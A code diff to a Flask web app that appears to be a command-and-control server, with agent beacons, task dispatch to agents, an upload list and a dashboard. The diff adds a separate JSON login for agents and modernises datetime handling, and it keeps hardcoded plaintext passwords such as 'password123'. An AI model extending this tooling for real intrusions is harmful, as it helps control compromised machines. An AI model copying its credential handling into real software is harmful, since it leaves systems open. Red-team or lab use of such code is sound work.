@@ -21,7 +21,9 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.secret_key = SECRET_KEY
 
 # --- Users ---
-users = {"admin": "password123", "user1": "pass1"}
+users = {"admin": "password123"}
+agents_creds = {"agent1": "pass1"}
+
 
 # --- Tasks dictionary keyed by UUID ---
 tasks = {
@@ -52,7 +54,8 @@ def beacon():
         "user": beacon_info.get("user"),
         "os": beacon_info.get("os"),
         "ip": request.remote_addr,
-        "last_seen": datetime.utcnow()
+        "last_seen": datetime.now(timezone.utc)
+
     }
 
     # Return first pending task for this agent
@@ -67,7 +70,7 @@ AGENT_ONLINE_TIMEOUT = 30  # seconds
 
 @app.route("/agents-data")
 def agents_data():
-    now = datetime.utcnow()
+    now = datetime.now(timezone.utc)
     data = []
 
     for agent_id, agent in agents.items():
@@ -91,7 +94,7 @@ def agents_list():
     if "username" not in session:
         return redirect(url_for("login"))
 
-    now = datetime.utcnow()
+    now = datetime.now(timezone.utc)
     agent_rows = []
 
     for agent_id, agent in agents.items():
@@ -192,14 +195,42 @@ def uploads_list():
 # --- Login / Logout ---
 @app.route("/login", methods=["GET", "POST"])
 def login():
+
+    # -------------------------
+    # 1. Agent Login (JSON)
+    # -------------------------
+    if request.method == "POST" and request.is_json:
+        data = request.get_json(silent=True) or {}
+
+        # Only treat as agent login if agent_id is present
+        if "agent_id" in data:
+            username = data.get("username")
+            password = data.get("password")
+
+            if username in agents_creds and agents_creds[username] == password:
+                return jsonify({"status": "agent_logged_in"}), 200
+
+            return jsonify({"error": "Unauthorized"}), 401
+
+    # -------------------------
+    # 2. Dashboard Login (HTML Form)
+    # -------------------------
     if request.method == "POST":
         username = request.form.get("username")
         password = request.form.get("password")
+
         if username in users and users[username] == password:
             session["username"] = username
             return redirect(url_for("dashboard"))
+
         return render_template("login.html", error="Invalid credentials")
+
+    # -------------------------
+    # 3. GET request → show login page
+    # -------------------------
     return render_template("login.html")
+
+
 
 @app.route("/logout")
 def logout():
@@ -207,7 +238,7 @@ def logout():
     return redirect(url_for("login"))
 
 # --- Dashboard ---
-AGENT_ONLINE_TIMEOUT = 30  # seconds
+
 
 @app.route("/dashboard")
 def dashboard():
